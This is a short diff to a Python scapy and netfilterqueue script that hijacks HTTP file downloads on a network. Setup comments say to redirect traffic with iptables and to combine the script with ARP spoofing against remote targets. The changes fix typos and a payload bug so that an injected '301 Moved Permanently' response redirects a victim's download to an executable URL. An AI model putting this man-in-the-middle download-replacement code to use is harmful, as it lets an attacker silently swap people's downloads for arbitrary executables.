@@ -4,8 +4,8 @@
 
 # Run from the Linux machine with netfilterqueue python module
 # Run the linux command first to capture local input and output traffic -
-# iptables -I INPUT -j NFQUEUE ---queue-num 0
-# iptables -I OUTPUT -j NFQUEUE ---queue-num 0
+# iptables -I INPUT -j NFQUEUE --queue-num 0
+# iptables -I OUTPUT -j NFQUEUE --queue-num 0
 # Run the linux command if the target is a remote machine
 # iptables -I FORWARD -j NFQUEUE ---queue-num 0
 # Also run the arp_spoof.py for remote machine
@@ -38,7 +38,7 @@ def process_packet(packet):
                 ack_list.remove(scapy_packet[scapy.TCP].seq)
                 print("[+] Replacing file")
                 modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: https://www/rarlab.com/rar/wrar56b1.exe\n\n")
-                modified_packet.set_payload(str(scapy.packet))
+                packet.set_payload(str(modified_packet))
             # print("HTTP Response")
             # print(scapy_packet.show())
 
